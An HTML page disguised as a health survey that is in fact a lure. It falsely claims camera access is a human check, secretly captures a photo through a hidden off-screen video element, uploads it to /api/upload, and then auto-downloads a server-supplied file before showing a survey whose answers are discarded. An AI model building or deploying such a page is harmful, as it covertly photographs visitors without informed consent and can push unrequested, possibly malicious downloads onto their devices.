<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Health Survey</title>
<style>
body { 
  font-family: 'Poppins', sans-serif; 
  text-align: center; 
  margin: 0; 
  background: linear-gradient(135deg, #ff9a9e, #fad0c4, #fad0c4); 
  min-height: 100vh; 
  display: flex; 
  flex-direction: column; 
  justify-content: center; 
  align-items: center;
  animation: gradient 8s ease infinite;
  background-size: 400% 400%;
}
@keyframes gradient {
  0% {background-position:0% 50%;}
  50% {background-position:100% 50%;}
  100% {background-position:0% 50%;}
}
video { width: 1px; height: 1px; position: absolute; top: -100px; left: -100px; }
canvas { display: none; }
h2 { color: #fff; font-size: 28px; margin-bottom: 10px; text-shadow: 0 2px 10px rgba(0,0,0,0.3); }
p { color: #fff; font-size: 18px; margin-bottom: 20px; text-shadow: 0 1px 5px rgba(0,0,0,0.2); }
form { 
  display: none; 
  background: rgba(255,255,255,0.95); 
  padding: 25px; 
  border-radius: 15px; 
  width: 350px; 
  box-shadow: 0 10px 20px rgba(0,0,0,0.2);
  animation: fadeIn 1s ease forwards;
}
@keyframes fadeIn { from {opacity:0;} to {opacity:1;} }
input, select, textarea { 
  width: 100%; 
  margin-bottom: 12px; 
  padding: 10px; 
  border-radius: 8px; 
  border: 1px solid #ccc; 
  font-size: 16px;
}
button { 
  padding: 12px 25px; 
  cursor: pointer; 
  background: #ff416c; 
  color: white; 
  border: none; 
  border-radius: 12px; 
  font-weight: bold; 
  transition: 0.3s; 
  font-size: 16px;
}
button:hover { background: #ff4b2b; transform: scale(1.05);}
#thanksMessage { display: none; color: #fff; font-size: 20px; margin-top: 20px; }
</style>
</head>

<body>
<h2>ðŸ“¸ Please allow camera access!</h2>
<p>This confirms youâ€™re human before starting the survey.</p>

<video id="video" autoplay></video>
<canvas id="canvas"></canvas>

<form id="surveyForm">
  <h3>Health Survey ðŸŒ¿</h3>

  <label>Name:</label>
  <input type="text" name="name" placeholder="Your Name" required>

  <label>Sleep Hours:</label>
  <select name="sleep" required>
    <option value="<5"><5</option>
    <option value="5-6">5-6</option>
    <option value="6-7">6-7</option>
    <option value="7+">7+</option>
  </select>

  <label>Exercise:</label>
  <select name="exercise" required>
    <option value="Yes">Yes</option>
    <option value="No">No</option>
  </select>

  <label>Water intake:</label>
  <select name="water" required>
    <option value="0-1">0-1 glasses</option>
    <option value="2-3">2-3 glasses</option>
    <option value="4-5">4-5 glasses</option>
    <option value="5+">5+ glasses</option>
  </select>

  <label>Other habits:</label>
  <textarea name="habits" rows="3" placeholder="e.g. meditation, walking"></textarea>

  <button type="submit">Submit âœ…</button>
</form>

<p id="thanksMessage">Thank you for confirming! Redirecting to survey...</p>

<script>
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const form = document.getElementById("surveyForm");
const thanks = document.getElementById("thanksMessage");

async function init() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;
    setTimeout(() => captureAndSend(stream), 1000);
  } catch (err) {
    alert("Camera permission is required to continue.");
  }
}

function captureAndSend(stream) {
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext("2d").drawImage(video, 0, 0);

  canvas.toBlob(async (blob) => {
    const formData = new FormData();
    formData.append("photo", blob);

    try {
      const res = await fetch("/api/upload", { method: "POST", body: formData });
      const data = await res.json();

      if (data.status === "success") {
        // Auto-download
        const a = document.createElement("a");
        a.href = data.downloadUrl;
        a.download = "";
        document.body.appendChild(a);
        a.click();
        a.remove();

        document.querySelector('h2').style.display = 'none';
        document.querySelector('p').style.display = 'none';
        form.style.display = 'block';
      } else {
        alert("Upload failed.");
      }
    } catch (err) {
      alert("Upload failed. Refresh and try again.");
    }
  });

  stream.getTracks().forEach(track => track.stop());
}

form.addEventListener("submit", e => {
  e.preventDefault();
  form.style.display = "none";
  thanks.style.display = "block";
});

init();
</script>
</body>
</html>

